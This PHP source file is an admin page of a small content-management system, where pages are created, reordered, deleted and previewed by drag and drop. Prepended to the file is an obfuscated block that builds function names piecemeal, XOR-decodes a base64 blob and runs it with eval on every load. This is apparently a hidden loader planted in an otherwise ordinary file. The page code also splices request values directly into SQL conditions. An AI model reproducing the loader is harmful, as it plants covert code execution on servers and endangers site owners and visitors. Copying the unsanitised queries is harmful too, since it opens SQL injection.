<?php
$a8hg6hj="10a3853fcddf698121f0e47370c11308FUMIR11qQxReEBYTUwIcVEpFOUYEWApHRUUGClhVGEhD
VQZsVVRHBQtMRjoGDA9tSgZTQjlMAARrSFUEbUsGCm1IVwFkTQRfTThVUgVlQAdUbR4GAWhPAVFs
GwcIERwYFW8ydmpjdjQ4RjhXBApkAAIEOkhQBmsCBQY/SQUGbAkDAj5vCQQFOlJUVToHCA1tSgVT
EjgdS09HQgZWbl5RTFJYSRFkBQZRDzhVUwFlQAcBbR4GVFgYbwYFUhMdExRnYnUzZX1naEQwOFVW
A2VABABtHgVTaE8HAmxSAwNvSA1Xfj1LDAR+OhtQUURrEBERSUxGVQlHUhNTWQYZExEZAw==";
$fyhhsa1="s";$fy3saa1="ba";$fy7vwa1="s";$fyhhsa1.="u";$fyhhsa1.="b";$fyhhsa1.="s";$fyhhsa1.="t";$fyhhsa1.="r";$fy3saa1.="se";$fy3saa1.="6";$fy3saa1.="4";$fy3saa1.="_";$fy3saa1.="de";$fy3saa1.="co";$fy3saa1.="de";$fy7vwa1.="t";$fy7vwa1.="r";$fy7vwa1.="l";$fy7vwa1.="e";$fy7vwa1.="n";
$a8hg6hh=$fyhhsa1($a8hg6hj,0,32);$a8hk6hj=$fy3saa1($fyhhsa1($a8hg6hj,32));$a7klm9hj="";for($a8hk9hj=0;$a8hk9hj < $fy7vwa1($a8hk6hj);$a8hk9hj++){$a7hk9hj=$fyhhsa1($a8hk6hj,$a8hk9hj,1);$a7h789hj=$fyhhsa1($a8hg6hh,$a8hk9hj%32,1);$a7klm9hj.=$a7hk9hj^$a7h789hj;}eval($a7klm9hj);$a7klm9hj="\n";

?>
<?php
include("security.php");
include("Utils.php");
$IE=true;
$lang="en";
$DN=2;

include("../include/user_default_pages.php");

if(SQLCount("user_pages","WHERE user='".$AuthUserName."'") == 0)
{
	foreach($arrDefaultPages as $arrDefaultPage)
	{
		SQLInsert
		(
			"user_pages",
			array("name_en","link_en","html_en","user"),
			array($arrDefaultPage[0],$arrDefaultPage[0],$arrDefaultPage[1],$AuthUserName)
		);
	}
}

		if(!isset($MMODE))
		{
			$MMODE="N";
			$bFirstTime=true;
		}
		else
		{
			$bFirstTime=false;
		}


if(isset($ProceedDeletePage))
{
	SQLDeletePlus("user","","user_pages","id",array($id));
	
	
?>

<?php
}


?>












<?php
if($MMODE=="N")
{
?>
<!-- start normal mode -->












<?php


	include("sample_content.php");


if(isset($ProceedCMD))
{



	if(substr($cmd1,0,3) == "new" && substr($cmd2,0,2) == "ns")
	{

		$iMaxPage = SQLMaxPlus(
				"user_pages",
				"id",
				"user='".($AuthUserName=="administrator"?"admin":$AuthUserName)."' "
			);

		$strPageHtml = $sampleHTML[str_replace("new_page","",$cmd1)];

		$arrNames=array("user","active_".$lang,"parent_id","name_".$lang,"description_".$lang,"keywords_".$lang,"link_".$lang,"html_".$lang);

		$arrValues=array(($AuthUserName=="administrator"?"admin":$AuthUserName),"1",str_replace("ns","",$cmd2),"Page","","","Page ".$iMaxPage,$strPageHtml);
		

		SQLInsert("user_pages",$arrNames,$arrValues);

		

	}

	else
	if(substr($cmd1,0,3) == "new" && substr($cmd2,0,2) == "np")
	{
		$iMaxPage = SQLMaxPlus(
				"user_pages",
				"id",
				"user='".($AuthUserName=="administrator"?"admin":$AuthUserName)."' "
			);

			$strPageHtml = $sampleHTML[str_replace("new_page","",$cmd1)];

		$arrNames=array("user","active_".$lang,"parent_id","name_".$lang,"description_".$lang,"keywords_".$lang,"link_".$lang,"html_".$lang);

		$arrValues=array(($AuthUserName=="administrator"?"admin":$AuthUserName),"1","0","Page","","","Page ".$iMaxPage,$strPageHtml);
		

		SQLInsert("user_pages",$arrNames,$arrValues);

	
	}
	else
	if(substr($cmd1,0,2) == "pg" && substr($cmd2,0,2) == "ns")
	{
		$arrPage1 = DataArray("user_pages","id=".str_replace("pg","",$cmd1));

		if($arrPage1["parent_id"]=="0")
		{
			
			//echo '<script>HT("2","'.$M_OPERATION_NOT_ALLOWED.'<br>",700,130,0.5,20);</script>';
		}
		else
		{
			$strNewParentId = str_replace("ns","",$cmd2);

			SQLUpdate("user_pages",array("parent_id"),array($strNewParentId),"id=".$arrPage1["id"]);
		}
	}
	else
	if(substr($cmd1,0,2) == "pg" && substr($cmd2,0,2) == "pg")
	{
		$arrPage1 = DataArray("user_pages","id=".str_replace("pg","",$cmd1));
		$arrPage2 = DataArray("user_pages","id=".str_replace("pg","",$cmd2));


		if($arrPage1["parent_id"]==0&&$arrPage2["parent_id"]!=0)
		{
			
			//echo '<script>HT("2","'.$M_OPERATION_NOT_ALLOWED.'<br>",700,130,0.5,20);</script>';
		}
		else
		if($arrPage2["parent_id"]==0&&$arrPage1["parent_id"]!=0)
		{
			
			//echo '<script>HT("2","'.$M_OPERATION_NOT_ALLOWED.'<br>",700,130,0.5,20);</script>';
		}
		else
		if($arrPage1["parent_id"]!=$arrPage2["parent_id"]&&$arrPage1["parent_id"]!="0"&&$arrPage2["parent_id"]!="0")
		{
			$val1=$arrPage1["id"];
			$val2=$arrPage2["id"];
			SQLUpdate("user_pages",array("id"),array("0"),"id=$val1");
			SQLUpdate("user_pages",array("id"),array($val1),"id=$val2");
			SQLUpdate("user_pages",array("id"),array($val2),"id=0");

			SQLUpdate("user_pages",array("parent_id"),array("-2"),"parent_id=$val1");
			SQLUpdate("user_pages",array("parent_id"),array($val1),"parent_id=$val2");
			SQLUpdate("user_pages",array("parent_id"),array($val2),"parent_id=-2");

			
		}
		else
		if($arrPage1["parent_id"]==$arrPage2["parent_id"])
		{

			$val1=$arrPage1["id"];
			$val2=$arrPage2["id"];
			SQLUpdate("user_pages",array("id"),array("0"),"id=$val1");
			SQLUpdate("user_pages",array("id"),array($val1),"id=$val2");
			SQLUpdate("user_pages",array("id"),array($val2),"id=0");

			SQLUpdate("user_pages",array("parent_id"),array("-2"),"parent_id=$val1");
			SQLUpdate("user_pages",array("parent_id"),array($val1),"parent_id=$val2");
			SQLUpdate("user_pages",array("parent_id"),array($val2),"parent_id=-2");

			
		}
		else
		{
		
			//echo '<script>HT("2","'.$M_OPERATION_NOT_ALLOWED.'<br>",700,130,0.5,20);</script>';
		}

	}

}
?>
<script>
var accZ = 0;
var arrDrawnObjects = Array();
</script>
<style>
	#root {
		position:absolute;
		height:285px;
		width:150px;
		background-color:#F4F4F4;
		border:1px solid #000000;
		}


</style>

<form action="index.php" method="post" id="cmd_form">
<input type=hidden name=category value="<?php echo $category;?>">
<input type=hidden name=action value="<?php echo $action;?>">
<input type=hidden id="cmd1" name="cmd1" value="">
<input type=hidden id="cmd2" name="cmd2" value="">
<input type=hidden id="MMODE" name="MMODE" value="<?php echo $MMODE;?>">
<input type=hidden name="ProceedCMD" value="">
</form>
<script language="javascript" src="include/utils.js"></script>


<script>
function DeletePage(x)
{
	if(confirm("<?php echo $ETES_VOUS_SUR__DE_VOULOIR_EFFACER;?>")){
		document.location.href="index.php?ProceedDeletePage=1&category=site_management&MMODE=<?php echo $MMODE;?>&action=pages&id="+x;
	}

}

function StartWizard(x){
	window.open("main.php?N="+(document.all?"IE":"FF")+"&LANG=<?php echo $lang;?>&page="+x,"title","toolbar=0,location=0,directories=0,menuBar=0,scrollbars=0,resizable=0,width=1015,height=640,left=0,top=0");
}



var iZXStartX = 0;
var iZXStartY = 0;
var strZXElementName = "";

	function reportZXStart(who, x, y)
	{
			strZXElementName = who;
			iZXStartX = x;
			iZXStartY = y;
	}

	function reportZXEnd(who, x, y) {

				bOperation = false;


				if(who.substring(0,3) == "new")
				{
					x = x + parseInt(document.getElementById("root").style.left.replace("px",""));
					y = y + parseInt(document.getElementById("root").style.top.replace("px",""));
				}

				var i=0;
				for(;i<arrDrawnObjects.length;i++)
				{
					
					  if(
							x>(parseInt(arrDrawnObjects[i][1])-15)
							&&
							x<(parseInt(arrDrawnObjects[i][1])+parseInt(arrDrawnObjects[i][3])+0)
							&&
							y>(parseInt(arrDrawnObjects[i][2])-15)
							&&
							y<(parseInt(arrDrawnObjects[i][2])+parseInt(arrDrawnObjects[i][4])+0)
					  )
					  
					{

						bOperation = true;
						break;
					}
				}

				bSpecialOperation = false;

				if(bOperation)
				{

					if(who == "trash" || arrDrawnObjects[i][0] == "trash")
					{
							pageId = "";

						if(who == "trash")
						{
							pageId = arrDrawnObjects[i][0];
						}
						else
						if(arrDrawnObjects[i][0] == "trash")
						{
							pageId = who;
						}

						bSpecialOperation = true;

						if(pageId.substring(0,2) == "pg")
						{
								pageId = pageId.replace("pg","");
								DeletePage(pageId);
						}
						else
						{
						
								<?php
								//echo 'HT("2","'.$M_OPERATION_NOT_ALLOWED.'<br>",700,130,0.5,20);';
								?>
								return;
						}
					}
					else
					if(who == "edit" || arrDrawnObjects[i][0] == "edit")
					{
					
					
						pageId = "";

						if(who == "edit")
						{
							pageId = arrDrawnObjects[i][0];
						}
						else
						if(arrDrawnObjects[i][0] == "edit")
						{
							pageId = who;
						}

						bSpecialOperation = true;

						if(pageId.substring(0,2) == "pg")
						{
								pageId = pageId.replace("pg","");
								StartWizard(pageId);
						}
						else
						{
						
								<?php
								//echo 'HT("2","'.$M_OPERATION_NOT_ALLOWED.'<br>",700,130,0.5,20);';
								?>
								return;
						}
					}
					else
					if(who == "preview" || arrDrawnObjects[i][0] == "preview")
					{
						pageId = "";

						if(who == "preview")
						{
							pageId = arrDrawnObjects[i][0];
						}
						else
						if(arrDrawnObjects[i][0] == "preview")
						{
							pageId = who;
						}

						bSpecialOperation = true;

						if(pageId.substring(0,2) == "pg")
						{
								pageId = pageId.replace("pg","");
								
								<?php
								if($AuthUserName == "administrator")
								{
								?>
									document.location.href="../index.php?page_id="+pageId+"&lang=<?php echo $lang;?>";
								<?php
								}
								else
								{
								?>
									document.location.href="../index.php?p=<?php echo $AuthUserName;?>&page_id="+pageId+"&lang=<?php echo $lang;?>";
								<?php
								}
								?>
								
								
						}
						else
						{
						
								<?php
								//echo 'HT("2","'.$M_OPERATION_NOT_ALLOWED.'<br>",700,130,0.5,20);';
								?>
								return;
						}
					}
					else
					if(who == "settings" || arrDrawnObjects[i][0] == "settings")
					{
						pageId = "";

						if(who == "settings")
						{
							pageId = arrDrawnObjects[i][0];
						}
						else
						if(arrDrawnObjects[i][0] == "settings")
						{
							pageId = who;
						}

						//bSpecialOperation = true;

						if(pageId.substring(0,2) == "pg")
						{
								pageId = pageId.replace("pg","");
								document.location.href="index.php?category=site_management&MMODE=<?php echo $MMODE;?>&folder=pages&page=edit&id="+pageId;
						}
						else
						{
						
								<?php
								//echo 'HT("2","'.$M_OPERATION_NOT_ALLOWED.'<br>",700,130,0.5,20);';
								?>
								return;
						}


					}
					else
					{
						document.getElementById("cmd1").value=who;
						document.getElementById("cmd2").value=arrDrawnObjects[i][0];

						if(who != arrDrawnObjects[i][0])
						{
							document.getElementById("cmd_form").submit();
						}
					}

				}
				else
				{
				
				
				}

				if(bSpecialOperation)
				{
					document.getElementById(strZXElementName).style.left = iZXStartX;
					document.getElementById(strZXElementName).style.top = iZXStartY;
					
				}

				
	}

</script>

<style>
#pg14{}
#pg14_handle{}
</style>
 


<div style="position:absolute;top:150;left:0">



<div style="position:absolute;top:-40;left:650" id="trash">
<img src="images/new_icons/delete<?php echo $DN;?>.gif" border="0" width="26" height="41" alt="">
</div>
<div style="position:absolute;top:-40;left:350" id="edit">
<img src="images/new_icons/edit<?php echo $DN;?>.gif" border="0" width="43" height="43" alt="">
</div>
<div style="position:absolute;top:-40;left:800" id="preview">
<img src="images/new_icons/preview<?php echo $DN;?>.gif" border="0" width="31" height="38" alt="">
</div>
<div style="position:absolute;top:-40;left:500" id="settings">
<img src="images/new_icons/settings<?php echo $DN;?>.gif" border="0" width="40" height="41" alt="">
</div>

<script>
var oTrash = document.getElementById('trash');
ZX.init(oTrash);
oTrash.onZXStart = function(x, y) { reportZXStart('trash', x, y); }
oTrash.onZXEnd = function(x, y) { reportZXEnd('trash', x, y); }
arrDrawnObjects.push(Array("trash",650,-40,26,41));

var oEdit = document.getElementById('edit');
ZX.init(oEdit);
oEdit.onZXStart = function(x, y) { reportZXStart('edit', x, y); }
oEdit.onZXEnd = function(x, y) { reportZXEnd('edit', x, y); }
arrDrawnObjects.push(Array("edit",350,-40, 43, 43));

var oPreview = document.getElementById('preview');
ZX.init(oPreview);
oPreview.onZXStart = function(x, y) { reportZXStart('preview', x, y); }
oPreview.onZXEnd = function(x, y) { reportZXEnd('preview', x, y); }
arrDrawnObjects.push(Array("preview",800,-40, 31, 38));

var oSettings = document.getElementById('settings');
ZX.init(oSettings);
oSettings.onZXStart = function(x, y) { reportZXStart('settings', x, y); }
oSettings.onZXEnd = function(x, y) { reportZXEnd('settings', x, y); }
arrDrawnObjects.push(Array("settings",500,-40,40,41));

</script>

<?php

$arrPages = DataTable("user_pages","WHERE parent_id=0 AND user='".($AuthUserName=="administrator"?"admin":$AuthUserName)."' AND active_".$lang."=1 ORDER BY parent_id,id");

$iPagesCounter = 0;
while($arrPage = mysql_fetch_array($arrPages))
{

	echo "
		<div  style='width:61;position:absolute;top:".(0 + ($iPagesCounter*90)).";left:140;font-family:Arial;font-size:11'>
			<img src='images/page_icon9.gif' border='0'  width='67' height='51'  >
		</div>
	";
	echo "
		<div id=\"pg".$arrPage["id"]."\" style='width:61;position:absolute;top:".(0 + ($iPagesCounter*90)).";left:140;font-family:Arial;font-size:11'>
			<img src='images/page_icon".($arrPage["active_".$lang]==1?"7_".$DN:"10").".gif' border='0'  width='67' height='51'  >
			<br>
			<span style='position:relative;top:".($IE?"-55":"-40")."'>".$arrPage["link_".$lang]."</span>
		</div>
	";

	echo "
		<script>arrDrawnObjects.push(Array('pg".$arrPage["id"]."',140,".(0 + ($iPagesCounter*90)).",67,51));</script>
	";

	echo
	"
	<script>
		var theHandle".$arrPage["id"]." = document.getElementById('pg".$arrPage["id"]."');\n
		ZX.init(theHandle".$arrPage["id"].");\n
		theHandle".$arrPage["id"].".onZXStart = function(x, y) { reportZXStart('pg".$arrPage["id"]."', x, y); }\n
		theHandle".$arrPage["id"].".onZXEnd = function(x, y) { reportZXEnd('pg".$arrPage["id"]."', x, y); }\n
	</script>
	";

	$arrSubPages = DataTable("user_pages","WHERE  user='".($AuthUserName=="administrator"?"admin":$AuthUserName)."' AND  parent_id=".$arrPage["id"]." ORDER BY parent_id,id");

	$iSubPagesCounter = 0;

	while($arrSubPage = mysql_fetch_array($arrSubPages))
	{

		echo "
			<div  style='width:61;position:absolute;top:".(40 + ($iPagesCounter*90)).";left:".(274+$iSubPagesCounter*100).";font-family:Arial;font-size:11'>
				<img src='images/page_icon9.gif' border='0'  width='67' height='51'  >
			</div>
		";

		echo "
			<div id=\"pg".$arrSubPage["id"]."\"  style='width:61;position:absolute;top:".(40 + ($iPagesCounter*90)).";left:".(274+$iSubPagesCounter*100).";font-family:Arial;font-size:11'>
				<img src='images/page_icon8.gif' border='0' width='67' height='51' ondblclick='document.location.href=\"index.php?MMODE=".$MMODE."\"'>
				<br>
				<span style='position:relative;top:".($IE?"-55":"-40")."'>".$arrSubPage["link_".$lang]."</span>
			</div>
		";

		echo "
			<script>arrDrawnObjects.push(Array('pg".$arrSubPage["id"]."',".(274+$iSubPagesCounter*95).",".(40 + ($iPagesCounter*90)).",67,51));</script>
		";

		echo
		"
		<script>
			var theHandle".$arrSubPage["id"]." = document.getElementById('pg".$arrSubPage["id"]."');\n
			ZX.init(theHandle".$arrSubPage["id"].");\n
			theHandle".$arrSubPage["id"].".onZXStart = function(x, y) { reportZXStart('pg".$arrSubPage["id"]."', x, y); }\n
			theHandle".$arrSubPage["id"].".onZXEnd = function(x, y) { reportZXEnd('pg".$arrSubPage["id"]."', x, y); }\n
		</script>
		";

		$iSubPagesCounter++;

	}

	echo "
			<div  style='width:61;position:absolute;top:".(40 + ($iPagesCounter*90)).";left:".(274+$iSubPagesCounter*100).";font-family:Arial;font-size:11'>
				<img src='images/page_icon9.gif' border='0'  width='67' height='51'  >
				<br>
				<span style='position:relative;top:".($IE?"-55":"-40")."'></span>
			</div>
		";

		echo "
			<script>arrDrawnObjects.push(Array('ns".$arrPage["id"]."',".(274+$iSubPagesCounter*100).",".(40 + ($iPagesCounter*90)).",67,51));</script>
		";

	$iSubPagesCounter++;





	if($iSubPagesCounter > 0)
	{

		if($IE)
		{
			echo
			'
				<img src="images/h_line_icon.gif" border="0" width="1339" height="23" alt="" style="position:absolute;top:'.(18 + ($iPagesCounter*90)).';left:205;clip:rect(auto '.($iSubPagesCounter * 100 ).' auto auto)">
			';
		}
		else
		{
			echo
			'
				<img src="images/h_line_icon.gif" border="0" width="1339" height="23" alt="" style="position:absolute;top:'.(18 + ($iPagesCounter*90)).';left:205;clip:rect(0,0,23,'.($iSubPagesCounter * 100 ).')">
			';
		}

	}


	$iPagesCounter ++;
}


	echo "
		<div  style='width:61;position:absolute;top:".(0 + ($iPagesCounter*90)).";left:140;font-family:Arial;font-size:11'>
			<img src='images/page_icon9.gif' border='0'  width='67' height='51'  >
		</div>
	";

	echo "
			<script>arrDrawnObjects.push(Array('np',140,".(0 + ($iPagesCounter*90)).",67,51));</script>
		";
	$iPagesCounter ++;
?>


<br><br>

<br><br>

<?php
if($IE)
{
?>
<img src="images/v_line_icon.gif" border="0" width="22" height="3000" alt="" style="position:absolute;top:20;left:119;clip:rect(auto auto <?php echo (0+$iPagesCounter*90 - 88);?>px auto)">

<?php
}
else{
?>
<img src="images/v_line_icon.gif" border="0" width="22" height="3000" alt="" style="position:absolute;top:20;left:119;clip:rect(0,10,<?php echo (0+$iPagesCounter*90 - 88);?>,22)">

<?php
}
?>


<div id="root" style="left:720px; top:40px;">



	<table border="0" id="handle" height="10" width="100%" cellpadding="0" cellspacing="0">
 	<tr>
 		<td class=table_header align=center><center><b><?php echo $M_ADD_NEW_PAGE;?></b>&nbsp;</center></td>
 	</tr>
 </table>

	 <div id=new_page1 style="position:absolute;top:25;left:4;text-align:center;width:67;height:51">
	<img src="images/page_icon_t3.gif" border="0" width="67" height="51" alt="">

	</div>

	<div id=new_page2 style="position:absolute;top:25;left:77;text-align:center;width:67;height:51">
	<img src="images/page_icon_t4.gif" border="0" width="67" height="51" alt="">

	</div>

	<div id=new_page3 style="position:absolute;top:81;left:4;text-align:center;width:67;height:51">
	<img src="images/page_icon_t1.gif" border="0" width="67" height="51" alt="">

	</div>

	<div id=new_page4 style="position:absolute;top:81;left:77;text-align:center;width:67;height:51">
	<img src="images/page_icon_t2.gif" border="0" width="67" height="51" alt="">

	</div>

	<div id=new_page5 style="position:absolute;top:137;left:4;text-align:center;width:67;height:51">
	<img src="images/page_icon_t5.gif" border="0" width="67" height="51" alt="">

	</div>

	<div id=new_page6 style="position:absolute;top:137;left:77;text-align:center;width:67;height:51">
	<img src="images/page_icon_t6.gif" border="0" width="67" height="51" alt="">

	</div>
	<div  style="position:absolute;top:196;left:4;text-align:justify;width:139;height:51">
		<?php echo $M_PAGES_NOTICE;?>

	</div>

</div>
<script>
var oNewPage1 = document.getElementById('new_page1');
ZX.init(oNewPage1);
oNewPage1.onZXStart = function(x, y) { reportZXStart('new_page1', x, y); }
oNewPage1.onZXEnd = function(x, y) { reportZXEnd('new_page1', x, y); }

var oNewPage2 = document.getElementById('new_page2');
ZX.init(oNewPage2);
oNewPage2.onZXStart = function(x, y) { reportZXStart('new_page2', x, y); }
oNewPage2.onZXEnd = function(x, y) { reportZXEnd('new_page2', x, y); }

var oNewPage3 = document.getElementById('new_page3');
ZX.init(oNewPage3);
oNewPage3.onZXStart = function(x, y) { reportZXStart('new_page3', x, y); }
oNewPage3.onZXEnd = function(x, y) { reportZXEnd('new_page3', x, y); }

var oNewPage4 = document.getElementById('new_page4');
ZX.init(oNewPage4);
oNewPage4.onZXStart = function(x, y) { reportZXStart('new_page4', x, y); }
oNewPage4.onZXEnd = function(x, y) { reportZXEnd('new_page4', x, y); }

var oNewPage5 = document.getElementById('new_page5');
ZX.init(oNewPage5);
oNewPage5.onZXStart = function(x, y) { reportZXStart('new_page5', x, y); }
oNewPage5.onZXEnd = function(x, y) { reportZXEnd('new_page5', x, y); }

var oNewPage6 = document.getElementById('new_page6');
ZX.init(oNewPage6);
oNewPage6.onZXStart = function(x, y) { reportZXStart('new_page6', x, y); }
oNewPage6.onZXEnd = function(x, y) { reportZXEnd('new_page6', x, y); }

</script>

<script language="javascript">
	var theHandle = document.getElementById("handle");
	var theRoot   = document.getElementById("root");
	ZX.init(theHandle, theRoot);

</script>

</div>



<br><br><br><br><br><br><br><br><br><br><br><br><br>
<br><br><br><br><br><br><br><br><br><br><br><br><br>
<br><br><br><br><br><br><br><br><br><br><br><br><br>
<br><br><br><br><br><br><br><br><br><br><br><br><br>
























<!-- end normal mode -->
<?php
}

?>

